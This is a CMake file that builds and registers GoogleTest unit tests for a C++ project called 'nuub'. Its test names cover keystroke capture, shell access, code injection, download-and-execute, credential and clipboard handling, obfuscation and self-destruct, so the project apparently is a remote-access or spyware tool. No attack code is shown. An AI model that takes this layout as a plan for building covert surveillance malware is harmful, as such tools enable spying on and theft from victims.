find_package(GTest CONFIG REQUIRED)

set(DOMAIN_TESTS
    domain/KeystrokeServiceTest.cpp
    domain/EncryptionServiceTest.cpp
    domain/AdminTest.cpp
    domain/AdminPermissionTest.cpp
    domain/AuditLoggerTest.cpp
    domain/StringTableTest.cpp
    domain/ConfigEncryptionTest.cpp
    domain/CompressorTest.cpp
    domain/ResultTest.cpp
    domain/ObfuscateTest.cpp
)

set(APPLICATION_TESTS
    application/CommandHandlerTest.cpp
    application/MediaHandlerTest.cpp
    application/LocationHandlerTest.cpp
    application/ShellHandlerTest.cpp
    application/InjectHandlerTest.cpp
    application/SelfDestructHandlerTest.cpp
    application/SysInfoHandlerTest.cpp
    application/ClipboardHandlerTest.cpp
    application/ProcessHandlerTest.cpp
    application/WifiHandlerTest.cpp
    application/FileManagerHandlerTest.cpp
    application/DownloadExecHandlerTest.cpp
    application/KeywordAlertHandlerTest.cpp
    application/CredentialHandlerTest.cpp
)

set(INFRASTRUCTURE_TESTS
    infrastructure/KeyResolverTest.cpp
    infrastructure/ActivityLoggerTest.cpp
    infrastructure/HeartbeatServiceTest.cpp
    infrastructure/IPGeolocationServiceTest.cpp
    infrastructure/SelfDestructServiceTest.cpp
)

add_executable(nuub_tests
    ${DOMAIN_TESTS}
    ${APPLICATION_TESTS}
    ${INFRASTRUCTURE_TESTS}
)

target_include_directories(nuub_tests PRIVATE ${CMAKE_SOURCE_DIR}/src)
target_link_libraries(nuub_tests PRIVATE
    GTest::gtest
    GTest::gtest_main
    nuub_domain
    nuub_application
    nuub_infrastructure
    CURL::libcurl
)

include(GoogleTest)
gtest_discover_tests(nuub_tests)
